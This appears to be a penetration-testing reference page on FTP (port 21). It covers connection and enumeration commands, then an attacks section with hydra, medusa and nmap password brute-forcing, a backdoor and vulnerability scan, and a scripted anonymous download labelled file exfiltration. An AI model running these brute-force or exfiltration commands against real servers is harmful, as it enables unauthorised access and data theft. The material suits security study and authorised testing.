---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# FTP (21)

## Usage

{% tabs %}
{% tab title="Connect" %}
```bash
# Connect to FTP server
ftp <target>

# No auto login (useful for scripts)
ftp -n <targetp> 

# Verbose mode         
ftp -v <target>          

# Log in as a specific user
ftp <user>@<target>
```
{% endtab %}

{% tab title="Banner Grabbing" %}
```bash
telnet <target> 21
nc <target> 21
```
{% endtab %}

{% tab title="Basic Commands" %}
```bash
# Basic FTP commands
ls                          # List files
dir                         # Detailed list of files
cd <directory>              # Change directory
lcd <local_directory>       # Change local directory
get <file>                  # Download file
mget <files>                # Download multiple files
put <file>                  # Upload file
mput <files>                # Upload multiple files
delete <file>               # Delete file
mkdir <directory>           # Create directory
rmdir <directory>           # Remove directory
pwd                         # Show remote current directory
bye / quit / exit           # Disconnect
```
{% endtab %}

{% tab title="Enumeration" %}
```bash
quote SYST                  # Get OS type
quote PASV                  # Check for passive mode
quote HELP                  # List server supported commands
quote STAT                  # Server status
quote FEAT                  # List server features
quote SITE HELP             # Site-specific commands
```
{% endtab %}

{% tab title="Transfer" %}
```bash
# Download an FTP directory
wget -r ftp://username:password@<target-ip>/path/to/directory/
```
{% endtab %}
{% endtabs %}

## Attacks

{% tabs %}
{% tab title="BFA" %}
```bash
# Using hydra
hydra -l <user> -P <passlist> ftp://<target> 

# Using medusa
medusa -h <target> -u <user> -P <passlist> -M ftp

# Using nmap 
nmap -p 21 --script ftp-brute <target>
```
{% endtab %}

{% tab title="Vulnerability Recon" %}
{% code overflow="wrap" %}
```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <target>
```
{% endcode %}
{% endtab %}

{% tab title="File Exfil" %}
```bash
# File exfiltration / upload with command-line FTP
echo "open <target>" > script.txt
echo "user anonymous anonymous" >> script.txt
echo "binary" >> script.txt
echo "get secret.txt" >> script.txt
echo "bye" >> script.txt
ftp -n -s:script.txt
```
{% endtab %}
{% endtabs %}
